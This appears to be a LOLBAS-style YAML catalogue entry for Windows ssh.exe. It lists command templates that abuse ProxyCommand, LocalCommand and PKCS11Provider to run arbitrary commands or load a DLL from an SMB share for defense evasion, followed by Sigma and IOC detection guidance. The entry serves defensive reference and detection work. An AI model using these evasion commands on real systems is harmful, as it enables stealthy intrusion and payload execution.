---
Name: ssh.exe
Description: Ssh.exe is the OpenSSH compatible client can be used to connect to Windows 10 (build 1809 and later) and Windows Server 2019 devices.
Author: Akshat Pradhan
Created: 2021-11-08
Commands:
  - Command: ssh localhost "{CMD}"
    Description: Executes specified command on host machine. The prompt for password can be eliminated by adding the host's public key in the user's authorized_keys file. Adversaries can do the same for execution on remote machines.
    Usecase: Execute specified command, can be used for defense evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10 1809, Windows Server 2019
    Tags:
      - Execute: CMD
  - Command: ssh -o ProxyCommand="{CMD}" .
    Description: Executes specified command from ssh.exe
    Usecase: Performs execution of specified file, can be used as a defensive evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10
    Tags:
      - Execute: CMD
  - Command: ssh -o PKCS11Provider="\\\\127.0.0.1\\Temp\\example.dll" win@github.com
    Description: Executes a DLL from an SMB share by abusing the PKCS11Provider option. The payload executes upon DLL load (DllMain) and requires exporting C_GetFunctionList to prevent premature termination by `ssh.exe`. Note that all backslashes should be escaped (i.e. every `\` should be turned into `\\`).
    Usecase: Performs indirect execution of a specified DLL from a remote share, can be used for defense evasion.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 11
    Tags:
      - Execute: DLL
      - Execute: Remote
  - Command: ssh.exe -o "StrictHostKeyChecking=no" -o "PermitLocalCommand=yes" -o "LocalCommand=cmd.exe /q /c {CMD}" -q user@host
    Description: Executes a local command via the LocalCommand option (enabled by PermitLocalCommand=yes) after the SSH session is successfully established and authenticated. Observed in the wild in the Star Blizzard RedFlick campaign. Can be used for defense evasion.
    Usecase: Execute arbitrary local command via legitimate Windows OpenSSH client.
    Category: Execute
    Privileges: User
    MitreID: T1202
    OperatingSystem: Windows 10, Windows 11, Windows Server 2019, Windows Server 2022
    Tags:
      - Execute: CMD
Full_Path:
  - Path: c:\windows\system32\OpenSSH\ssh.exe
Code_Sample:
  - Code: https://gist.github.com/screetsec/97d90750bfb058eb0b49c5374cdc0ac9
Detection:
  - Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_ssh.yml
  - IOC: Event ID 4624 with process name C:\Windows\System32\OpenSSH\sshd.exe.
  - IOC: command line arguments specifying execution.
  - IOC: ssh.exe process creation containing PermitLocalCommand or LocalCommand in command line arguments (note that options loaded from an SSH config file via -F or the default %USERPROFILE%\.ssh\config do not appear on the ssh.exe command line).
  - IOC: ssh.exe spawning a child process such as cmd.exe, powershell.exe, msiexec.exe or rundll32.exe. LocalCommand executes through cmd.exe (ssh.exe spawns cmd.exe which spawns the payload). This parent-child relationship also catches config-file (-F) variants where execution flags are absent from the command line.
Resources:
  - Link: https://gtfobins.github.io/gtfobins/ssh/
